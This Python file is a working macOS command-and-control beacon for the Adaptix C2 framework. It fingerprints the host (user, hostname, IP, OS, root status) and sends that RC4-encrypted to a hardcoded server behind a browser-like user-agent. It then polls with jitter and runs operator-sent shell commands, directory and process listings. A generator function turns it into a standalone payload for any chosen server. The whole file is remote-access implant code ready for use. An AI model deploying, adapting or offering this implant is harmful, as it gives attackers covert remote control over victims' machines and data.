#!/usr/bin/env python3
"""
Adaptix C2 HTTP Beacon for macOS
Implements the Adaptix beacon protocol for cross-platform agents.

Protocol details (reverse engineered from Adaptix source):
- Encryption: RC4 with configured key
- Packing: Big-endian binary format
- HTTP: POST with beacon ID in X-Request-ID header (base64)
- Response: RC4 encrypted commands
"""

import os
import sys
import socket
import struct
import base64
import random
import time
import subprocess
import urllib.request
import urllib.error
import platform
import getpass
import json
from typing import Optional, Tuple

# Configuration - matches the existing Adaptix listener
CONFIG = {
    "c2_host": "192.168.36.226",
    "c2_port": 8080,
    "uri": "/api/update",
    "method": "POST",
    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "encrypt_key": bytes.fromhex("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"),
    "hb_header": "X-Request-ID",
    "sleep_time": 5,
    "jitter": 0.2,
}

# Command types
CMD_NOP = 0
CMD_SHELL = 1
CMD_UPLOAD = 2
CMD_DOWNLOAD = 3
CMD_EXIT = 4
CMD_SLEEP = 5
CMD_PWD = 6
CMD_CD = 7
CMD_LS = 8
CMD_PS = 9
CMD_WHOAMI = 10


class RC4:
    """RC4 encryption/decryption - matches Adaptix Crypt.cpp"""
    
    def __init__(self, key: bytes):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.S_initial = self.S.copy()
    
    def crypt(self, data: bytes) -> bytes:
        """Encrypt or decrypt data"""
        S = self.S_initial.copy()
        i = j = 0
        result = bytearray(len(data))
        
        for k in range(len(data)):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result[k] = data[k] ^ S[(S[i] + S[j]) % 256]
        
        return bytes(result)


class Packer:
    """Binary packer - matches Adaptix Packer.cpp (big-endian)"""
    
    def __init__(self, data: bytes = b""):
        self.buffer = bytearray(data)
        self.index = 0
    
    def pack64(self, value: int):
        self.buffer.extend(struct.pack(">Q", value))
    
    def pack32(self, value: int):
        self.buffer.extend(struct.pack(">I", value))
    
    def pack16(self, value: int):
        self.buffer.extend(struct.pack(">H", value))
    
    def pack8(self, value: int):
        self.buffer.append(value & 0xFF)
    
    def pack_bytes(self, data: bytes):
        """Pack bytes with 4-byte length prefix"""
        self.pack32(len(data))
        self.buffer.extend(data)
    
    def pack_string(self, s: str):
        """Pack string as bytes"""
        self.pack_bytes(s.encode('utf-8'))
    
    def data(self) -> bytes:
        return bytes(self.buffer)
    
    # Unpacking methods
    def unpack8(self) -> int:
        if self.index >= len(self.buffer):
            return 0
        val = self.buffer[self.index]
        self.index += 1
        return val
    
    def unpack16(self) -> int:
        if self.index + 2 > len(self.buffer):
            return 0
        val = struct.unpack(">H", self.buffer[self.index:self.index+2])[0]
        self.index += 2
        return val
    
    def unpack32(self) -> int:
        if self.index + 4 > len(self.buffer):
            return 0
        val = struct.unpack(">I", self.buffer[self.index:self.index+4])[0]
        self.index += 4
        return val
    
    def unpack_bytes(self) -> bytes:
        size = self.unpack32()
        if size == 0 or self.index + size > len(self.buffer):
            return b""
        data = bytes(self.buffer[self.index:self.index+size])
        self.index += size
        return data
    
    def unpack_string(self) -> str:
        return self.unpack_bytes().decode('utf-8', errors='replace')


class AdaptixBeacon:
    """macOS HTTP Beacon for Adaptix C2"""
    
    def __init__(self, config: dict):
        self.config = config
        self.agent_id = random.randint(0, 0xFFFFFFFF)
        self.rc4 = RC4(config["encrypt_key"])
        self.active = True
        
        # Collect system info
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.pid = os.getpid()
        self.internal_ip = self._get_internal_ip()
        self.os_info = self._get_os_info()
    
    def _get_internal_ip(self) -> str:
        """Get internal IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_os_info(self) -> dict:
        """Get OS version info"""
        return {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
        }
    
    def _build_agent_info(self) -> bytes:
        """Build initial agent info packet - matches AgentInfo.cpp structure"""
        packer = Packer()
        
        # Agent ID (4 bytes)
        packer.pack32(self.agent_id)
        
        # ACP and OEMCP (2 bytes each) - not relevant for macOS, use defaults
        packer.pack16(65001)  # UTF-8
        packer.pack16(65001)
        
        # GMT offset (4 bytes)
        import time
        gmt_offset = int(-time.timezone / 60)  # Minutes
        packer.pack32(gmt_offset & 0xFFFFFFFF)
        
        # PID and TID (2 bytes each)
        packer.pack16(self.pid & 0xFFFF)
        packer.pack16(0)  # TID not meaningful for Python
        
        # Flags (1 byte each)
        packer.pack8(1 if os.geteuid() == 0 else 0)  # elevated
        packer.pack8(1 if platform.machine() == "arm64" else 0)  # arch64
        packer.pack8(1)  # sys64
        
        # Build number (4 bytes) - macOS doesn't have this, use 0
        packer.pack32(0)
        
        # Major/Minor version (4 bytes each)
        try:
            version_parts = platform.mac_ver()[0].split('.')
            major = int(version_parts[0]) if len(version_parts) > 0 else 10
            minor = int(version_parts[1]) if len(version_parts) > 1 else 15
        except:
            major, minor = 10, 15
        packer.pack32(major)
        packer.pack32(minor)
        
        # Is server (1 byte)
        packer.pack8(0)
        
        # Internal IP as long (4 bytes)
        try:
            ip_bytes = socket.inet_aton(self.internal_ip)
            ip_long = struct.unpack(">I", ip_bytes)[0]
        except:
            ip_long = 0
        packer.pack32(ip_long)
        
        # Strings: username, domain, hostname, process
        packer.pack_string(self.username)
        packer.pack_string("")  # domain - not relevant for macOS
        packer.pack_string(self.hostname)
        packer.pack_string(sys.executable)
        
        return packer.data()
    
    def _execute_command(self, cmd_type: int, cmd_data: bytes) -> bytes:
        """Execute a command and return result"""
        packer = Packer()
        
        try:
            if cmd_type == CMD_NOP:
                return b""
            
            elif cmd_type == CMD_SHELL:
                # Execute shell command
                cmd = cmd_data.decode('utf-8', errors='replace')
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        timeout=30
                    )
                    output = result.stdout + result.stderr
                except subprocess.TimeoutExpired:
                    output = b"Command timed out"
                except Exception as e:
                    output = f"Error: {str(e)}".encode()
                
                packer.pack32(CMD_SHELL)
                packer.pack_bytes(output)
            
            elif cmd_type == CMD_PWD:
                packer.pack32(CMD_PWD)
                packer.pack_string(os.getcwd())
            
            elif cmd_type == CMD_CD:
                path = cmd_data.decode('utf-8', errors='replace')
                try:
                    os.chdir(path)
                    packer.pack32(CMD_CD)
                    packer.pack_string(os.getcwd())
                except Exception as e:
                    packer.pack32(CMD_CD)
                    packer.pack_string(f"Error: {str(e)}")
            
            elif cmd_type == CMD_LS:
                path = cmd_data.decode('utf-8', errors='replace') if cmd_data else "."
                try:
                    entries = []
                    for entry in os.listdir(path):
                        full_path = os.path.join(path, entry)
                        try:
                            stat = os.stat(full_path)
                            is_dir = os.path.isdir(full_path)
                            entries.append(f"{'d' if is_dir else '-'} {stat.st_size:12} {entry}")
                        except:
                            entries.append(f"? {0:12} {entry}")
                    
                    packer.pack32(CMD_LS)
                    packer.pack_string("\n".join(entries))
                except Exception as e:
                    packer.pack32(CMD_LS)
                    packer.pack_string(f"Error: {str(e)}")
            
            elif cmd_type == CMD_PS:
                try:
                    result = subprocess.run(
                        ["ps", "aux"],
                        capture_output=True,
                        timeout=10
                    )
                    packer.pack32(CMD_PS)
                    packer.pack_bytes(result.stdout)
                except Exception as e:
                    packer.pack32(CMD_PS)
                    packer.pack_string(f"Error: {str(e)}")
            
            elif cmd_type == CMD_WHOAMI:
                packer.pack32(CMD_WHOAMI)
                packer.pack_string(f"{self.username}@{self.hostname}")
            
            elif cmd_type == CMD_SLEEP:
                # Parse new sleep time
                if len(cmd_data) >= 4:
                    new_sleep = struct.unpack(">I", cmd_data[:4])[0]
                    self.config["sleep_time"] = new_sleep
                packer.pack32(CMD_SLEEP)
                packer.pack32(self.config["sleep_time"])
            
            elif cmd_type == CMD_EXIT:
                self.active = False
                packer.pack32(CMD_EXIT)
                packer.pack_string("Goodbye")
            
            else:
                packer.pack32(cmd_type)
                packer.pack_string(f"Unknown command type: {cmd_type}")
        
        except Exception as e:
            packer.pack32(cmd_type)
            packer.pack_string(f"Exception: {str(e)}")
        
        return packer.data()
    
    def beacon(self) -> bool:
        """Send beacon and process response"""
        try:
            # Build beacon packet
            packer = Packer()
            
            # First beacon includes agent info
            if not hasattr(self, '_registered'):
                packer.pack8(0x01)  # Init type
                packer.pack_bytes(self._build_agent_info())
                self._registered = True
            else:
                packer.pack8(0x00)  # Heartbeat type
                packer.pack32(self.agent_id)
            
            # Encrypt packet
            packet = packer.data()
            encrypted = self.rc4.crypt(packet)
            
            # Build HTTP request
            url = f"http://{self.config['c2_host']}:{self.config['c2_port']}{self.config['uri']}"
            
            # Beacon ID in header (base64 of agent_id)
            beat_id = base64.b64encode(struct.pack(">I", self.agent_id)).decode()
            
            headers = {
                "User-Agent": self.config["user_agent"],
                self.config["hb_header"]: beat_id,
                "Content-Type": "application/octet-stream",
            }
            
            req = urllib.request.Request(
                url,
                data=encrypted,
                headers=headers,
                method=self.config["method"]
            )
            
            # Send request
            with urllib.request.urlopen(req, timeout=30) as resp:
                if resp.status == 200:
                    response_data = resp.read()
                    if response_data:
                        # Decrypt response
                        decrypted = self.rc4.crypt(response_data)
                        
                        # Parse commands
                        resp_packer = Packer(decrypted)
                        while resp_packer.index < len(decrypted):
                            cmd_type = resp_packer.unpack8()
                            if cmd_type == 0:
                                break
                            
                            cmd_data = resp_packer.unpack_bytes()
                            result = self._execute_command(cmd_type, cmd_data)
                            
                            # Send result back
                            if result:
                                self._send_result(result)
            
            return True
        
        except urllib.error.HTTPError as e:
            # 404 is expected when no commands
            if e.code == 404:
                return True
            print(f"HTTP Error: {e.code}")
            return False
        
        except Exception as e:
            print(f"Beacon error: {e}")
            return False
    
    def _send_result(self, result: bytes):
        """Send command result back to C2"""
        try:
            encrypted = self.rc4.crypt(result)
            
            url = f"http://{self.config['c2_host']}:{self.config['c2_port']}{self.config['uri']}"
            beat_id = base64.b64encode(struct.pack(">I", self.agent_id)).decode()
            
            headers = {
                "User-Agent": self.config["user_agent"],
                self.config["hb_header"]: beat_id,
                "Content-Type": "application/octet-stream",
                "X-Result": "1",
            }
            
            req = urllib.request.Request(url, data=encrypted, headers=headers, method="POST")
            
            with urllib.request.urlopen(req, timeout=30) as resp:
                pass
        
        except Exception as e:
            print(f"Send result error: {e}")
    
    def run(self):
        """Main beacon loop"""
        print(f"[*] Adaptix Beacon starting")
        print(f"[*] Agent ID: {hex(self.agent_id)}")
        print(f"[*] C2: {self.config['c2_host']}:{self.config['c2_port']}")
        print(f"[*] System: {self.username}@{self.hostname} ({self.internal_ip})")
        
        while self.active:
            try:
                self.beacon()
                
                # Sleep with jitter
                sleep_time = self.config["sleep_time"]
                jitter = self.config["jitter"]
                actual_sleep = sleep_time + (random.random() * 2 - 1) * sleep_time * jitter
                time.sleep(max(1, actual_sleep))
            
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(10)
        
        print("[*] Beacon stopped")


def generate_standalone_payload(c2_host: str, c2_port: int = 8080, 
                                  encrypt_key: str = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6") -> str:
    """Generate a standalone macOS payload script"""
    
    # Read this file and embed config
    with open(__file__, 'r') as f:
        source = f.read()
    
    # Modify CONFIG
    new_config = f'''CONFIG = {{
    "c2_host": "{c2_host}",
    "c2_port": {c2_port},
    "uri": "/api/update",
    "method": "POST",
    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "encrypt_key": bytes.fromhex("{encrypt_key}"),
    "hb_header": "X-Request-ID",
    "sleep_time": 5,
    "jitter": 0.2,
}}'''
    
    # Replace CONFIG in source
    import re
    source = re.sub(
        r'CONFIG = \{.*?\}',
        new_config,
        source,
        flags=re.DOTALL
    )
    
    # Add auto-run
    source += '''

if __name__ == "__main__":
    beacon = AdaptixBeacon(CONFIG)
    beacon.run()
'''
    
    return source


if __name__ == "__main__":
    # Run beacon directly
    beacon = AdaptixBeacon(CONFIG)
    beacon.run()
